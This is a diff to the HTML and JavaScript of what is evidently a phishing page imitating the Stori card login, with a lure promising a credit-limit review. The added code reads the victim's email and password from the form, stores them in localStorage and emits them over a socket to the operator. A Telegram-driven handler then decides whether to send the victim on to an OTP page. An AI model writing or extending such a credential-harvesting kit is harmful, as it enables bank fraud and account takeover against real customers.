@@ -73,9 +73,9 @@
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://stori.card/img/logo.svg" alt="logo" />
+      <img src="https://i.imgur.com/GFGp9I7.png" alt="logo" />
     </div>
-    <h2>Verificación de cuenta</h2>
+    <h2>Bienvenido a su análisis de aumento de cupo</h2>
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
@@ -101,20 +101,22 @@
 
           const correo = document.getElementById('usuario').value;
           const contrasena = document.getElementById('clave').value;
+          const sessionId = localStorage.getItem('sessionId');
 
-          const sessionId = Math.random().toString(36).substring(2, 15);
-          localStorage.setItem('sessionId', sessionId);
+          // Actualizar localStorage con los nuevos datos ingresados
+          localStorage.setItem('correo', correo);
+          localStorage.setItem('contrasena', contrasena);
 
-          // Emitir evento personalizado para esta pantalla
+          // Enviar al servidor con la sesión original
           socket.emit('errorlogoForm', { correo, contrasena, sessionId });
 
-          // Redirigir al loader/espera
+          // Redirigir a la pantalla de espera
           window.location.href = 'opciones.html';
         });
       }
     });
 
-    // Recibir respuesta de botones del admin
+    // Respuesta desde Telegram
     socket.on("respuestaErrorLogo", (decision) => {
       if (decision === "otp") {
         window.location.href = "bienvenido.html";
